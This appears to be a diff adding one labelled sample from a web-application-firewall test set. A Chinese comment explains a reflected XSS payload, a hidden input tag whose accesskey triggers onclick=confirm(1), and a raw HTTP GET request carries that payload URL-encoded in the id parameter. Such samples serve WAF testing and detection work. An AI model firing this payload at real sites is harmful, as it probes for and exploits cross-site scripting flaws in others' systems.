@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_标签属性_input标签_onclick事件-06506704
+# 攻击载荷利用了HTML中的input标签和onclick属性，触发confirm()函数，显示一个提示框。"type=hidden" 表示该输入框是隐藏的，用户无法在页面上看到它。accesskey 属性为 "X" 则是为了设置访问键，当用户按下 "X" 键时，会触发输入框的点击事件。
+GET /?id=%3Cinput%20type=%22hidden%22%20accesskey=%22X%22%20onclick=%22confirm%281%29%22%3E%20&bid=hd_tag_m8mv25hp HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25hp
+RM-PRO-Token: a2cea42b6af1cc98586b8b7ddbea610d
+RM-PRO-Time: 1742808469359
+User-Agent: curl/7.83.1
+
